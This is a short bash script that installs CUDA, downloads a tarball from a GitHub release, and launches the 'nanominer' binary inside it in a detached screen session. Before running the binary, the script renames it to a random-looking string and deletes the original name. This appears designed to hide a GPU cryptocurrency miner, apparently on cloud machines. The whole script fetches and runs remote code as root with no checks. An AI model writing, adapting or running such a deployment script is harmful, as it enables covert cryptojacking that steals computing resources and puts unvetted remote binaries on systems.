#!/bin/bash
apt-get update
apt-get install -y git wget screen
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin 
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo wget https://developer.download.nvidia.com/compute/cuda/11.6.1/local_installers/cuda-repo-ubuntu1804-11-6-local_11.6.1-510.47.03-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu1804-11-6-local_11.6.1-510.47.03-1_amd64.deb
sudo apt-key add /var/cuda-repo-ubuntu1804-11-6-local/7fa2af80.pub
sudo apt-get update
sudo apt-get -y install cuda
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/platinum
wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum.tar.gz
mv platinum.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf platinum.tar.gz
rm -rf platinum.tar.gz && cd platinum
mv nanominer $azure -n
cp $azure "$cpuname"
rm -f  nanominer
echo $cpuname" is starting"
screen -d -m ./"${cpuname}"
